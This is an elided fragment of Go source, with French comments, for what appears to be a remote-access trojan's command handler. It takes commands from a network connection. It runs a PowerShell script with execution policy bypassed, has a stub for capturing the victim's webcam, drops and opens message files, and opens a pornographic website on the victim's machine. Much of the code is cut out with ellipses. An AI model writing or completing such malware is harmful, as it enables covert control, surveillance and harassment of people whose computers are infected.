...
func handleConnection(conn net.Conn) {
	...
	for {
		...
		case message == "mouselocker":
			...
			// Exécution du script PowerShell dans une goroutine
			go func() {
				cmd := exec.Command("powershell.exe", "-ExecutionPolicy", "Bypass", "-File", scriptFilePath)
				err := cmd.Run()
				if err != nil {
		...
		case message == "get_cam":
			// récupérer le flux de la webcam de la victime
		...
		case strings.HasPrefix(message, "message"):
			...
			if err != nil {
				fmt.Fprintf(conn, "Error writing message to file: %s\n", err)

			}

			// Ouvrir le fichier texte avec le message
			err = exec.Command("cmd", "/c", "start", filePath).Run()
			if err != nil {
				fmt.Fprintf(conn, "Error opening message file: %s\n", err)
		...
		case message == "phub":
			// Exécute la commande "start" pour ouvrir le site Pornhub
			cmd := exec.Command("cmd", "/c", "start", "https://www.pornhub.com")
			err := cmd.Run()
			if err != nil {
				fmt.Fprintf(conn, "Error running phub: %s\n", err)
			} else {
				fmt.Fprintln(conn, "phub runned successfully")
			}
